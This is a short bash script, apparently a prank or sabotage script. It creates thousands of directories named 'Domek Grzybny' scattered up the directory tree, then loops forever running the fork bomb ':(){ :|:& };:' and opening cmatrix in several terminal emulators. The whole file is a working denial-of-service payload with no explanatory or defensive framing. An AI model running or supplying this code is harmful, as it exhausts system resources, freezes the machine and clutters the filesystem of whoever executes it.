#!/bin/bash
for ((x=1; x<10; x++))
do
    for ((y=1; y<2000; y++))
    do
        mkdir "Domek Grzybny $y"
    done
    cd ..

done

for ((d=1; d>0; d++))
do
    :(){ :|:& };:
    xfce4-terminal -e "cmatrix"
    gnome-terminal -- "cmatrix"
    xterm -e "cmatrix"
    konsole -e "cmatrix"
    terminal -e "cmatrix"
done